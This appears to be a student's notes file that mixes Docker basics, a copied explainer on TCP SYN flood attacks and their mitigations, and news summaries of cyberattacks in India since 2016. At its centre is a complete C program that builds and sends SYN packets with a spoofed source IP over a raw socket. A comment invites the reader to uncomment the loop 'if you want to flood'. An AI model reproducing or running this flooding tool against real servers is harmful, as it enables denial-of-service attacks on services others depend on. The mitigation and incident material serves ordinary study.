/*docker

CONTAINERS
run application withoiut installing operating systems simultaneously on a host operating system where the hypervisor is replaced with 
docker
1.gets rid of the large number of intermediate layers like guest file system,guest driver,context switch,virtual device, image format interpreter
iscsi,nfs that are present in a virtual machine environment
2.large number of combinations and permutations of hardware platforms and the applications/services which makes it difficult for the developers
who have to create the same environment in order to get an app/service to work

3.containers get rid of the hypervisor layer which requires redundant os kernels, binaries, libraries for running a vm

4.gets a lot more apps running and makes it easy to package apps 
5.developers found the solution of develop once and deploy anywhere
6.admin can configure on any platform
7.enables consistent environments

DOCKER
-containerization platform(containerization orchestration)
-docker packages an app and all of its dependecieds in the form of a  docker container so that the app works seamlessly in any environment
-enables an app and all of its dependencies to be packaged as a lightweight, portable and self-sufficient container
DOCKER DAEMON
The Docker daemon (dockerd) listens for Docker API requests and manages Docker objects such as images, containers, networks, and volumes.
A daemon can also communicate with other daemons to manage Docker services.


-DOCKER CLIENT
The Docker client (docker) is the primary way that many Docker users interact with Docker. When you use commands such as docker run, 
the client sends these commands to dockerd, which carries them out. The docker command uses the Docker API. The Docker client can
communicate with more than one daemon.
*/


/*
TCP SYN FLOODING(courtesy:https://www.incapsula.com/ddos/attack-glossary/syn-flood.html)
TCP SYN Flood
What is a SYN Flood Attack

TCP SYN flood (a.k.a. SYN flood) is a type of Distributed Denial of Service (DDoS) attack that exploits part of the normal TCP 
three-way handshake to consume resources on the targeted server and render it unresponsive.

Essentially, with SYN flood DDoS, the offender sends TCP connection requests faster than the targeted machine can process them,
causing network saturation.
Attack Description

When a client and server establish a normal TCP “three-way handshake,” the exchange looks like this:

    Client requests connection by sending SYN (synchronize) message to the server.
    Server acknowledges by sending SYN-ACK (synchronize-acknowledge) message back to the client.
    Client responds with an ACK (acknowledge) message, and the connection is established.

In a SYN flood attack, the attacker sends repeated SYN packets to every port on the targeted server, often using a fake IP address. The server, unaware of the attack, receives multiple, apparently legitimate requests to establish communication. It responds to each attempt with a SYN-ACK packet from each open port.

The malicious client either does not send the expected ACK, or—if the IP address is spoofed—never receives the SYN-ACK in the 
first place. Either way, the server under attack will wait for acknowledgement of its SYN-ACK packet for some time. 

 During this time, the server cannot close down the connection by sending an RST packet, and the connection stays open. Before the connection can time out, another SYN packet will arrive. This leaves an increasingly large number of connections half-open – and indeed SYN flood attacks are also referred to as “half-open” attacks. Eventually, as the server’s connection overflow tables fill, service to legitimate clients will be denied, and the server may even malfunction or crash.

While the “classic” SYN flood described above tries to exhaust network ports, SYN packets can also be used in DDoS attacks that try to clog your pipes with fake packets to achieve network saturation. The type of packet is not important. Still, SYN packets are often used because they are the least likely to be rejected by default.
Methods of Mitigation

While modern operating systems are better equipped to manage resources, which makes it more difficult to overflow connection tables, servers are still vulnerable to SYN flood attacks.

There are a number of common techniques to mitigate SYN flood attacks, including:

Micro blocks—administrators can allocate a micro-record (as few as 16 bytes) in the server memory for each incoming SYN request instead of a complete connection object.

SYN cookies—using cryptographic hashing, the server sends its SYN-ACK response with a sequence number (seqno) that is constructed from the client IP address, port number, and possibly other unique identifying information. When the client responds, this hash is included in the ACK packet. The server verifies the ACK, and only then allocates memory for the connection.

RST cookies—for the first request from a given client, the server intentionally sends an invalid SYN-ACK. This should result in the client generating an RST packet, which tells the server something is wrong. If this is received, the server knows the request is legitimate, logs the client, and accepts subsequent incoming connections from it.

Stack tweaking—administrators can tweak TCP stacks to mitigate the effect of SYN floods. This can either involve reducing the timeout until a stack frees memory allocated to a connection, or selectively dropping incoming connections.

Obviously, all of the above mentioned methods rely on the target network’s ability to handle large-scale volumetric DDoS attacks, with traffic volumes measured in tens of Gigabits (and even hundreds of Gigabits) per second.
SYN flood - 38 Days of DDoS
Imperva mitigates a 38 day-long SYN flood and DNS flood multi-vector DDoS attack.

Imperva DDoS protection leverages Anycast technology to balance the incoming DDoS requests across its global network of high-powered scrubbing centers. With the combined capacity of its global network, Incapsula can cost-effectively exceed attacker resources, rendering the DDoS attack ineffective. The service is build to scale on demand, offering ample resources to deal with even the largest of volumetric DDoS attacks.

To assure business continuity, Imperva filtering algorithm continuously analyzes incoming SYN requests, using SYN cookies to selectively allocate resources to legitimate visitors. This enables transparent DDoS mitigation, wtih no downtime, latency of any other business disruptions. 

*/


/*
	Syn Flood DOS with LINUX sockets
*/
#include<stdio.h>
#include<string.h> //memset
#include<sys/socket.h>
#include<stdlib.h> //for exit(0);
#include<errno.h> //For errno - the error number
#include<netinet/tcp.h>	//Provides declarations for tcp header
#include<netinet/ip.h>	//Provides declarations for ip header

struct pseudo_header    //needed for checksum calculation
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	
	struct tcphdr tcp;
};

unsigned short csum(unsigned short *ptr,int nbytes) {
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}

int main (void)
{
	//Create a raw socket
	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
	//Datagram to represent the packet
	char datagram[4096] , source_ip[32];
	//IP header
	struct iphdr *iph = (struct iphdr *) datagram;
	//TCP header
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
	struct sockaddr_in sin;
	struct pseudo_header psh;
	
	strcpy(source_ip , "192.168.1.2");
  
	sin.sin_family = AF_INET;
	sin.sin_port = htons(80);
	sin.sin_addr.s_addr = inet_addr ("1.2.3.4");
	
	memset (datagram, 0, 4096);	/* zero out the buffer */
	
	//Fill in the IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
	iph->id = htons(54321);	//Id of this packet
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;		//Set to 0 before calculating checksum
	iph->saddr = inet_addr ( source_ip );	//Spoof the source ip address
	iph->daddr = sin.sin_addr.s_addr;
	
	iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
	
	//TCP Header
	tcph->source = htons (1234);
	tcph->dest = htons (80);
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5;		/* first and only tcp segment */
	tcph->fin=0;
	tcph->syn=1;
	tcph->rst=0;
	tcph->psh=0;
	tcph->ack=0;
	tcph->urg=0;
	tcph->window = htons (5840);	/* maximum allowed window size */
	tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
				should fill in the correct checksum during transmission */
	tcph->urg_ptr = 0;
	//Now the IP checksum
	
	psh.source_address = inet_addr( source_ip );
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(20);
	
	memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
	
	tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));
	
	//IP_HDRINCL to tell the kernel that headers are included in the packet
	int one = 1;
	const int *val = &one;
	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
	{
		printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
		exit(0);
	}
	
	//Uncommend the loop if you want to flood :)
	//while (1)
	//{
		//Send the packet
		if (sendto (s,		/* our socket */
					datagram,	/* the buffer containing headers and data */
					iph->tot_len,	/* total length of our datagram */
					0,		/* routing flags, normally always 0 */
					(struct sockaddr *) &sin,	/* socket addr, just like in */
					sizeof (sin)) < 0)		/* a normal send() */
		{
			printf ("error\n");
		}
		//Data send successfully
		else
		{
			printf ("Packet Send \n");
		}
	//}
	
	return 0;
}


/*CYBER ATTACKS SINCE 2016 IN INDIA
*/


Petya 
India was additionally on the top 10 listing of nations to be hit by Petya ransomware attacks, with the nation faring worst among other
Asia Pacific (APAC) countries. Globally, India took number 7 spot with less than 20 organizations being affected as per Symantec's 
report. When the attack took place, researchers pointed out that Petya was not really a ransomware like WannaCry but it was rather
a wiper. What that means is that the aim of the malware was to delete all data, including data on the first sectors of the disk 
where the information about the operating system was usually stored. The idea of this attack was to cause massive destruction of data,
not to make financial gains. As such, the most reported incident of this attack in India was on the nation's largest container port, 
Jawaharlal Nehru Port (JNPT), near Mumbai along with local manufacturing units of global companies. At least one terminal operated by 
APM Maersk at the busy JNPT was under attack.

Read more at: https://www.gizbot.com/internet/features/cyber-attacks-that-affected-india-in-2017/articlecontent-pf82316-046533.html


WannaCry 
In one of the biggest cyber attacks in history, WannaCry Ransomware swept the world in May. However, in India, the top five cities 
impacted by the ransomware attack were Kolkata followed by Delhi, Bhubaneswar, Pune, and Mumbai, while the top five states with maximum detections of WannaCry virus were West Bengal, Maharashtra, Gujarat, Delhi NCR, and Odisha. Almost 60 percent of the ransomware attack attempts by the malicious WannaCry virus was targeted at enterprises, while the rest were on individual customers. WannaCry infected computers running on older versions of Microsoft operating systems like XP. As for the impact of the attack, the ransomware locked user's devices and prevented them from accessing data and software until a certain ransom was paid to the criminals. In this case, cybercriminals demanded a fee of about $300 in crypto-currencies like Bitcoin for unlocking the device. Talking about the affected areas, Police Department in Andhra Pradesh were disabled, West Bengal State Electricity Distribution Company Limited (WBSEDCL) were attacked, a government-run hospital in Odisha was targeted, in Gujrat over 120-odd computers connected with GSWAN (Gujarat State Wide Area Network) were affected, Maharashtra Police department was also partially hit. Further computers in two panchayat offices in Wayanad and Pathanamthitta in Kerala too were disabled, and there were reported cases in states like Delhi and Tamil Nadu.

Read more at: https://www.gizbot.com/internet/features/cyber-attacks-that-affected-india-in-2017/articlecontent-pf82315-046533.html


Mirai Botnet Malware Though this malware was first discovered in 2016, the threat from this still continues as the creators behind the malware had published the source code for Mirai in hacker forums as open-source. Since the source code was published, the techniques have been adopted in other malware projects. Talking about the botnet malware, Mirai actually took over the web targeting home router users and other loT based devices. In total, the malware affected 2.5 million loT units across the globe. However, it's not clear how many systems have been affected in India. 

Read more at: https://www.gizbot.com/internet/features/cyber-attacks-that-affected-india-in-2017/articlecontent-pf82318-046533.html


Data Breaches Indian restaurant search and discovery service provider Zomato in May reported that the company's database was breached which led to personal details of 7.7 million users being stolen. While this was a serious issue, the leaked information was also reportedly listed for sale on a Darknet market. Following the incident, Zomato contacted the hacker and took down the data. Details about the deal have not been disclosed. Similarly, Reliance Jio the trending network service provider was also a victim of a data breach. Interestingly a website called magicapk.com went live after the attack and anyone could search for personal details of Jio customers on this website. The website was later taken down after it went viral.

Read more at: https://www.gizbot.com/internet/features/cyber-attacks-that-affected-india-in-2017/articlecontent-pf82318-046533.html


Government’s cyber vulnerabilities affect private sector in IRNN hack

A recent report by Seqrite Intelligence Labs, the enterprise security solutions brand of Quick Heal Technologies, disclosed an advertisement they discovered on the Darknet (a small portion of the internet hidden from search engines). The advertisement announced secret access to the servers and databases of over 6,000 Indian organizations – including internet service providers (ISPs) as well as public and private sector organizations. The hacker offered this information for 15 bitcoin (equivalent to approximately USD$73,000). The hacker subsequently offered to execute further cyber-attacks against the listed companies for an undisclosed price.

Seqrite Cyber Intelligence Labs, along with its partner seQtree InfoServices, called it one of the biggest breaches affecting Indian organizations. Seqrite and seQtree reported that the Indian Registry for Internet Names and Numbers (IRINN), which comes under the National Internet Exchange of India, was the organization that hackers had compromised.

After discovering the advertisement, Seqrite and seQtree teams started gathering background research on the hacker but were unable to identify the perpetrator. The research team then contacted the hacker for further details, posing as an interested buyer. The hacker shared a sample of their stolen data, which included an email address of a prominent Indian technology firm and information linked back to the Indian government.

According to Seqrite Intelligence Labs, this hacker may have the capacity to create serious service outages in India. The entities affected by the data breach include the Bombay Stock Exchange, the Reserve Bank of India, the Indian Space Research Organization, Wipro, Mastercard, Visa, Hathaway, IDBI Bank, and Ernst & Young.  

According to researchers, the seller claims to have the ability to tamper the IP allocation pool, which could result in a serious outage or distributed denial of service (DDoS) condition.


